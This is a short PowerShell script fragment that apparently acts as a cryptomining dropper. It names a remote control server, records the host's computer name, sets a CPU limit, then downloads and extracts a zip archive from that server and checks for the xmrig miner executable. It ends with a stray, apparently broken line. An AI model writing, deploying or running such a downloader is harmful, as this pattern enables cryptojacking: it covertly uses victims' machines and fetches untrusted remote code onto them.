$SERVER = "https://mcontrol.vercel.app/"
$SYSTEM = $env:COMPUTERNAME

$TEMP_DIR = "$env:TEMP\worker_env"
$WORKER = $false
$CPU_LIMIT = 70

$BASE_DIR = "C:\soft"
$TEMP_DIR = "C:\soft\temp"
$M =   "C:\soft\temp\m"
$MINER_EXE = "$TEMP_DIR\m\xmrig-6.25.0\xmrig.exe"

        # Ensure base directory exists
        if (!(Test-Path $BASE_DIR)) {
            New-Item -ItemType Directory -Path $BASE_DIR | Out-Null
        }

        # Ensure temp directory exists
        if (!(Test-Path $TEMP_DIR)) {
            New-Item -ItemType Directory -Path $TEMP_DIR | Out-Null
        }
        New-Item -ItemType Directory -Path $M | Out-Null
          Write-Host "m folder created"
          $zipFile = "$TEMP_DIR\m.zip"
          $minerZipUrl = "https://mcontrol.vercel.app/m.zip"

        Write-Host "Downloading mining package..."

        Invoke-WebRequest `
            -Uri $minerZipUrl `
            -OutFile $zipFile `
            -UseBasicParsing

        Write-Host "Extracting mining package..."

        Expand-Archive `
            -Path $zipFile `
            -DestinationPath $M `
            -Force
         Write-Host "unzipped"
        Remove-Item $zipFile -Force
        if (!(Test-Path $MINER_EXE)) {
            Write-Host "xmrig.exe not found!"
            return
        } 

Mit "stop"